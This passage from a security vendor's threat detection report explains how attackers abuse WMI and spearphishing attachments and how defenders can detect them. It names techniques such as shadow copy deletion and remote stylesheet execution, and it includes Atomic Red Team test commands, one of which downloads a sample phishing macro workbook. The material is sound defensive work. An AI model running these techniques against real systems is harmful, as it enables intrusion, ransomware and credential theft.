Executing processes with wmic.exe

Discovering system information

Scheduling persistence with WMI structures

Launching WMI from Office documents to execute commands in phishing campaigns

Bypassing application whitelisting controls

Emerging tactics

Some less common—but no less interesting—uses of WMI include:

•

Deletion of shadow copies, likely to avoid using vssadmin.exe

•  WMI copying commands to the clipboard in fileless infections

•

Execution of stylesheets with wmic.exe

As its prevalence suggests, many threats and threat actors use WMI in their attacks and campaigns. Some noteworthy

examples include:

•

•

•

Emotet

Metasploit

Cobalt Strike

•  WannaCry

•

•

NotPetya

OilRig

80

2020 Threat Detection Report

•

•

•

Olympic Destroyer

Empire

Lazarus Group

Sighted with

Adversaries commonly leverage WMI in concert with PowerShell (T1086), Windows Management Instrumentation Event

Subscription (T1084), and XSL Script Processing (T1220). We frequently detect WMI with PowerShell largely because of the

Get-WMICObject cmdlet, which adversaries use to locally or remotely query the Windows operating system to enumerate

information or execute new processes.

As we noted above, adversaries are known to execute stylesheets with wmic.exe, which explains why we see threats leveraging

WMI and XSL Script Processing together. This might be a direct result of the “Squiblytwo” attack technique discussed in

the Detection section below. WMI is commonly used to install event filters and consumers, which is why our detections are

sometimes tagged with both WMI and the WMI Event Subscription technique.

C U S T O M E R S   A F F E C T E D

Definition

T 1 0 4 7 :   W I N D O W S   M A N A G E M E N T   I N S T R U M E N T A T I O N

Windows Management Instrumentation (WMI) is a Windows administration feature that provides a uniform environment

for local and remote access to Windows system components. It relies on the WMI service for local and remote access

and the server message block (SMB) and Remote Procedure Call Service (RPCS)  for remote access. RPCS operates over

port 135. An adversary can use WMI to interact with local and remote systems and use it as a means to perform many

tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement.

81

2020 Threat Detection Report

Detection
MITRE’s data sources

•

•

•

•

Authentication logs

Netflow/Enclave netflow

Process monitoring

Process command-line parameters

Collection requirements

In addition to those data sources listed by MITRE, Windows WMI logging and Sysmon WMI event codes (e.g., 19:

WmiEventFilter activity detected, 20: WmiEventConsumer activity detected, and 21: WmiEventConsumerToFilter activity

detected) are also good sources to collect from if you want to detect malicious uses of WMI.

Process monitoring and command-line parameters

Telemetry drawn from process monitoring and command-line parameters can be useful for detecting adversarial uses of

WMI, and you can collect it via EDR tools, Sysmon, or native command-line logging in Windows 7 and newer versions.

Process monitoring enables detection strategies that look for malicious use of wmic.exe for process creation, Lateral

Movement, and reconnaissance.

Sysmon

Compared to other data sources—WMI Activity logging, for example—enabling additional Sysmon logging will generate a

lot of noise. However, the data format is easier to manipulate and ingest into a SIEM, making it easier to build detection

strategies around.

Windows EventIDs

EventID 5861 logs generate a permanent record of WMI event subscriptions.

Detection suggestions

In general, only trusted binaries and known administrative tools and processes will initiate WMI activity. As such, it makes

sense to look for known bad or unusual processes launching WMI.

New WMI event consumers will execute the WMI Provider Host (`WMIPrvSE.exe`) process. Monitoring WMIPrvSE.exe for

abnormal child processes, such asPowerShell or cmd.exe, is a reliable way to detect malice. Emotet, for example, uses this

82

2020 Threat Detection Report

technique to obscure the normal parent-child relationship and execute encoded PowerShell commands via WMIPrvSE.exe

to download second-stage executables.

Permanent WMI event consumers offer adversaries a stealthy method of persistence. However, permanent event consumer

subscriptions are logged by WMI logging and Sysmon. Legitimate software will leverage these, but they occur infrequently

and are easy to monitor for malicious use.

Looking for unusual parent-child relationships with unique command-line parameters is another solid indicator of malice.

It should be rare for something like the IIS worker process (w3wp.exe) to spawn wmic.exe. When this occurs, it warrants

investigation. This can be a sign that an adversary is leveraging a web shell for process creation, reconnaissance, or for

remote access after initially accessing an environment. It is also rare for browsers (IE, Edge, Chrome, Firefox, etc.) to spawn

wmic.exe, and, when it does happen, it’s usually bad.

In cases where wmic.exe is being used for credential theft, defenders might consider looking for wmic.exe executions with

unusual module loads, including:

•

•

•

samlib.dll

vaultcli.dll

Cross process injection into the Local Security Authority Subsystem Service (lsass.exe)

That last point requires elevated permissions but can be a reliable signal of credential theft and post-exploitation tools

such as Mimikatz.

As noted earlier, adversaries frequently abuse wmic.exe to bypass application whitelisting controls and download and

execute malicious VBScript or JScript stylesheets from remote network resources. This technique is known colloquially as

“Squiblytwo,” and security teams can detect it by looking for instances of wmic.exe with URLs in the command lines and

that include the “format” option. This will typically be accompanied by a module load of jscript.dll and vbscript.dll into

wmic.exe.

Some malware families will use wmic.exe to create local antivirus exclusions to prevent antivirus-based detection. Because

of this, it makes sense to look out for unusual binaries that are unsigned and included in antivirus exclusion rules.

Further, it’s almost always malicious when wmic.exe spawns as a child process of Microsoft Word, PowerPoint, MSPublisher,

Visio, Access, Outlook, Onenote, WordPad, or Excel. As such, it makes sense to examine the chain of execution and follow-

on activity when this occurs.

Wmic can also leverage the WMI subsystem to execute commands or files remotely. Cobalt Strike, Koadic, and many other

red team and post-exploitation frameworks will spawn unique and unsigned binaries or commands remotely using the

well-known process call create command. Monitoring what is being executed in this context can reliably turn up malice. It

also makes sense to look out for wmic.exe making remote connections.

Some other considerations:

•

•

Adversaries can use wmic.exe to interact with remote systems, conduct reconnaissance, and move laterally.

Since there are more common tools that are easier to use, Win32_Process create is rarely used for legitimate reasons

and should be regarded with suspicion.

83

2020 Threat Detection Report

•

•

Reconnaissance is harder to detect because it looks very similar to normal admin behavior

Surrounding context is important in identifying if queries are malicious or benign

If you want to detect ransomware using WMI to delete shadow copies, consider looking for wmic.exe execution with

command lines including shadowcopy delete.

In rare instances, adversaries running fileless attacks will redirect WMI outputs to the clipboard, which can be detected by

looking for command lines that include output and clipboard.

WMI can be stealthily used in almost every phase of an attack. When adversaries leverage it to enumerate local user

accounts and profile devices, security teams can detect it by looking for things such as wmic.exe profiling user accounts,

domain information, or even PowerShell querying the operating system or executing new processes, either locally or

remotely. Cmdlets such as Get-WMIObject are often used for reconnaissance.

Weeding out false positives

Network flow logs and on-the-wire WMI traffic is commonly encrypted, so it will blend into standard DCOM/PSRemoting

traffic and could generate high volumes of false negatives. This is yet another reason—along with minimal logging and

defender knowledge of WMI—why attackers love WMI.

Testing

Start testing your defenses against Windows Management Instrumentation using Atomic Red Team—an open source

testing framework of small, highly portable detection tests mapped to MITRE ATT&CK.

84

2020 Threat Detection Report

Getting started

View Atomic tests for T1047: Windows Management Instrumentation. In most environments, these should be sufficient to

generate a useful signal for defenders.

Run this test on a Windows system using Command Prompt:

wmic /node:”127.0.0.1” process call create “calc.exe”

Useful telemetry will include:

DATA SOURCE

TELEMETRY

Process monitoring

child processes of wmiprivse.exe

Process command line

“process”, “create”

85

2020 Threat Detection Report

Review and repeat

Now that you have executed one or several common tests and checked for the expected results, it’s useful to answer some

immediate questions:

•  Were any of your actions detected?

•  Were any of your actions blocked or prevented?

•  Were your actions visible in logs or other defensive telemetry?

Repeat this process, performing additional tests related to this technique. You can also create and contribute tests

of your own.

D E T E C T I O N   S T R A T E G I S T

Jesse Brown
D E T E C T I O N   E N G I N E E R

The detection strategies in this section were brought to you

by Jesse Brown! As a Detection Engineer for Red Canary’s

Cyber Incident Response Team, Jesse works alongside a

talented team dedicated to quickly identify and remediate

threats in customer environments. He enjoys dissecting

malware and adversary techniques to help improve the

Red Canary detection engine. Jesse holds a Master’s of

Professional Studies in Cybersecurity and Information

Assurance from The Pennsylvania

State University.

86

2020 Threat Detection Report

A D D I T I O N A L   R E S E A R C H :   T E C H N I Q U E   T 1 1 9 3

Spearphishing Attachment

Virtually any adversary can send a phishing email with an attachment and nearly everyone has an email address, hence
why Spearphishing Attachments are so prominent.

22%

O R G A N I Z A T I O N S
A F F E C T E D

266

C O N F I R M E D
T H R E A T S

#20

O V E R A L L
R A N K

Analysis

2018

13

2019

20

Change      7

Falling from 13th in 2018 to 20th in 2019,

Spearphishing Attachment decreased both in

terms of customers affected and percent of

total threat volume.

Why do adversaries use Spearphishing Attachments?

Given the way we detect threats and map detection logic to ATT&CK, we are not able to effectively distinguish between

targeted and scattershot phishing attacks. For the purposes of this report, any phishing attack that relies on a malicious

attachment is considered a Spearphishing Attachment, and the subsequent analysis and detection strategies refer to both

techniques.

Spearphishing Attachments have been very effective for a long time. Historically, adversaries would embed overtly

malicious binaries as attachments in email messages. When the email service providers put controls in place to make

that far more difficult, adversaries evolved and adopted other methods, including drive-by downloads, exploiting

vulnerabilities, leveraging malicious macros, and embedding payloads in various different file types.

87

2020 Threat Detection Report

Ultimately, there are many factors that contribute to the popularity of this technique:

•

•

•

•

Human psychology—people trust sender information and are inclined to open attachments

Sending a phishing email costs almost nothing

Nearly everyone has an email address

Open-source research can improve targeting and effectiveness

T H R E A T   V O L U M E

How do adversaries use Spearphishing Attachments?

Adversaries have been embedding macros in Microsoft Office documents and using them to deliver malware since the mid-

2000s. The popularity of malicious macros has ebbed and flowed over the years, as drive-by downloads and other malware

delivery mechanisms came into and out of prominence. However, macro-based phishing schemes have dominated in

recent years, and they’ve become more potent than ever with the aid of malicious scripts and tools such as PowerShell.

We often find malware hidden in a ZIP file to subvert scanning tools that would otherwise block malicious attachments at

the perimeter. Qbot, for example, uses a VBS file that masquerades as a Word document hidden in a ZIP file for its initial

infection vector.

Improvements in email interfaces, filtering, and other technologies have made it more difficult to launch successful

phishing attacks. However, there is no simple technical fix for phishing. Prevention remains highly dependent on

educational efforts, training, and behavioral change.

Sighted with

As we mentioned in the PowerShell section of this report, Spearphishing Attachments often occur in tandem with PowerShell

(T1086). In fact, the two techniques occur together more frequently than Spearphishing Attachment occurs on its own. We

also observe it in tandem with Command Line Interface (T1059), because PowerShell and Scripting activity manifests on the

command line, and User Execution (T1204), as Spearphishing Attachments routinely require user interaction.

88

2020 Threat Detection Report

C U S T O M E R S   A F F E C T E D

Definition

T 1 1 9 3 :   S P E A R P H I S H I N G   A T T A C H M E N T

Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other

forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are

electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario,

adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution.

Detection
MITRE’s data sources

•

•

•

•

•

•

File monitoring

Packet capture

Network intrusion detection system

Detonation chamber

Email gateway

Mail server

Collection requirements

Process monitoring

In addition to those listed by MITRE ATT&CK, process monitoring is another valid data source for observing Spearphishing

89

2020 Threat Detection Report

Attachments. Security teams should monitor process activity taking place around the time that an email is read for

evidence of attachments executing malicious code.

Email gateways

Email gateways provide an easy and comprehensive way to filter received emails—effectively in real time—based on

filenames, email size, sender information, subject lines, text within the email, and several other parameters. Email

gateways can be tuned with rules that quarantine, delete, or forward potentially suspicious email messages—based on any

or all of the attributes above.

Mail servers

Similar to the email gateway solutions, mail servers hold a historic archive of sent and received email messages for a given

domain. System administrators can use the mail server to access user emails or block senders, to name a couple of actions.

Detonation chamber

A detonation chamber allows organizations to safely execute the code stored in malicious attachments in a controlled

environment, mitigating the risk of infection. Although this defensive measure is effective against most varieties of

Spearphishing Attachments, adversaries can delay execution or stop it altogether when the malicious code is detonated in

a virtual environment.

Detection suggestions

Spearphishing attacks frequently use Microsoft Office products to execute shell binaries on a victim’s endpoint. In order

to detect this behavior, consider using an EDR platform to monitor suspicious processes spawning from Office documents.

Some examples of processes spawning from malicious attachments include:

•  Windows Scripting Host (wscript.exe or cscript.exe)

•

•

Command Processor (cmd.exe)

PowerShell (powershell.exe) to execute code

It’s also worthwhile to monitor your environment for uncommon email attachment types, such as:

•

•

•

Extensions associated with legacy Office documents (e.g., DOC instead of DOCX)

Attachments with unknown file extensions that are capable of executing code or mounting disks (e.g., ISO or IMG)

Archive file attachments not common within your organization (e.g., RAR or ACE)

Sender Policy Framework (SPF) records allow domain owners to publish a list of IP addresses that are authorized to send

emails on the organization’s behalf. Security teams can reliably detect certain spoofing actions by comparing information

from emails received to this list and flagging emails that come from unusual IP addresses.

90

2020 Threat Detection Report

Lastly, unsolicited emails received from an external sender—particularly those that are sent outside of normal business

hours—should be flagged as suspicious.

While generally a good practice for smaller and medium-sized organizations, mail server-based security controls can be

unmanageable for large organizations that send and receive tens of thousands of emails on a daily basis.

Weeding out false positives

Detonation chambers, file monitoring, and packet capture solutions are effective at inspecting attachments and identifying

executables in different ways. However, they frequently flag legitimate communications between users who are exchanging

benign executables.

Testing

Start testing your defenses against Spearphishing Attachment using Atomic Red Team—an open source testing framework

of small, highly portable detection tests mapped to MITRE ATT&CK.

91

2020 Threat Detection Report

Getting started

View Atomic tests for T1193: Spearphishing Attachment. In most environments, these should be sufficient to generate a

useful signal for defenders.

Run this test on a Windows system using PowerShell:

if (-not(Test-Path HKLM:SOFTWARE\Classes\Excel.Application)){

  return ‘Please install Microsoft Excel before running this test.’

}

else{

  $url = ‘https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/

T1193/bin/PhishingAttachment.xlsm’

  $fileName = ‘PhishingAttachment.xlsm’

  New-Item -Type File -Force -Path $fileName | out-null

  $wc = New-Object System.Net.WebClient

  $wc.Encoding = [System.Text.Encoding]::UTF8

[Net.ServicePointManager]::SecurityProtocol = [Net.

SecurityProtocolType]::Tls12

  ($wc.DownloadString(“$url”)) | Out-File $fileName

}

Useful telemetry will include:

DATA SOURCE

TELEMETRY

Process monitoring

Child processes of excel.exe

Network connection

Established from a child process below Excel

92

2020 Threat Detection Report

Review and repeat

Now that you have executed one or several common tests and checked for the expected results, it’s useful to answer some

immediate questions:

•  Were any of your actions detected?

•  Were any of your actions blocked or prevented?

•  Were your actions visible in logs or other defensive telemetry?

Repeat this process, performing additional tests related to this technique. You can also create and contribute tests

of your own.

D E T E C T I O N   S T R A T E G I S T

Ernesto Lleras
D E T E C T I O N   E N G I N E E R

The detection strategies in this section were brought to

you by Ernesto Lleras! Ernesto relentlessly investigates

customer environments for evidence of malicious behavior.

Before joining Red Canary, he worked as a cybersecurity

analyst for a regional bank.

93